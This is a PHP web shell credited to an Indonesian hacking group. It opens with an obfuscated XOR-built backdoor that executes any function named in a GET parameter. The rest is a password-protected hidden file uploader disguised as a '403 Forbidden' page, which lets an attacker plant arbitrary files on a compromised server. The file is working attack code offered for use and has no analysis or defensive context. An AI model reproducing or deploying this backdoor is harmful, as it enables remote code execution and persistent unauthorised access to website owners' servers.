<?php 
$_="{";
$_=($_^"<").($_^">;").($_^"/");?>
<?=${'_'.$_}["_"](${'_'.$_}["__"]);?>
<?php
// Uploader Protect With Password
// Code by Mr.Bumblebee

session_start();
@error_reporting(0);
@set_time_limit(0);

$pwd = "f55fc9719a066603197dfe4a184d906b"; // MD5: default pass mr.bumblebee
function Login() {
?>
<html>
<head>
 <title>403 Forbidden</title>
<meta charset="UTF-8">
<meta name="author" content="Snoopy-Sec ID">
<meta name="description" content="Uploader Protect With Password - Snoopy-Sec ID">
 <style>
  @import url(http://fonts.googleapis.com/css?family=Inconsolata);
  @import url(http://fonts.googleapis.com/css?family=Geo);
  body {
    background: url(https://wallpaperlayer.com/img/2015/9/anime-background-5986-6255-hd-wallpapers.jpg) no-repeat fixed;
    -webkit-background-size: 100% 100%;
    -moz-background-size: 100% 100%;
    -o-background-size: 100% 100%;
    background-size: 100% 100%;
    background-attachment: fixed;
  }
  input[type=password] {
    width: 250px;
    height: 25px;
    color: white;
    background: black;
    border: 1px solid lime;
    font-family: 'Inconsolata', cursive;
    text-align: center;
  }
  .hacker_name {
    color: red;
    text-align: center;
    font-family: 'Geo', cursive;
  }
  table {
    width: 100%;
    height: 100%;
  }
 </style>
</head>
<body>
 <table>
  <td align="center">
   <h1 class="hacker_name">Snoopy-Sec ID</h1>
   <form method="post">
   <input type="password" name="pass">
   </form>
  </td>
 </table>
</body>
</html>

<?php
exit;
}
 if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
  if( empty($pwd) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $pwd) ) )

$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
   else
      Login();
echo "<h1>Hidden Uploader</h1>";
echo "<center><form action='' method='post' enctype='multipart/form-data'>
<input type='file' name='file'>
<button type='submit' name='up' value='Upload'>Upload!</button></form></center>";
 if(isset($_POST['up'])) {
  if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
    echo "<p class='successfully'>Upload Sukses :)</p>";
  }else {
    echo "<p class='error'>Wahh asu upload gagal, try again bro!</p>";
  }
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
 }
echo "<h2 class='copy'>Copyright 2017 - Recoded by Snoopy-Sec ID - Mr.Bumblebee</h2>";
?>
}
 <style>
  @import url(http://fonts.googleapis.com/css?family=Inconsolata);
  @import url(http://fonts.googleapis.com/css?family=Geo);
  body {
    background: url(https://wallpaperlayer.com/img/2015/9/anime-background-5986-6255-hd-wallpapers.jpg) no-repeat fixed;
    -webkit-background-size: 100% 100%;
    -moz-background-size: 100% 100%;
    -o-background-size: 100% 100%;
    background-size: 100% 100%;
    background-attachment: fixed;
    font-family: 'Inconsolasta', cursive;
  }
  h1 {
    color: lime;
    font-family: 'Geo', cursive;
    text-align: center;
    margin-top: 100px;
  }
  input {
    background: black;
    color: yellow;
    border: 1px solid lime;
  }
  button {
    background: black;
    color: yellow;
    border: 1px solid lime;
  }
  .copy {
    color: red;
    position: absolute;
    bottom: 0;
    width: 100%;
    height: 10%;
    text-align: center;
    font-family: 'Geo', cursive;
    font-size: 20px;
  }
  .successfully {
    color: lime;
    margin-right: 25px;
    font-family: 'Inconsolata', cursive;
  }
  .error {
    color: red;
    margin-right: 25px;
    font-family: 'Inconsolata', cursive;
  }
 </style>
<?php
exit;

// selesai dah :) thanks!
// Indonesia
?>
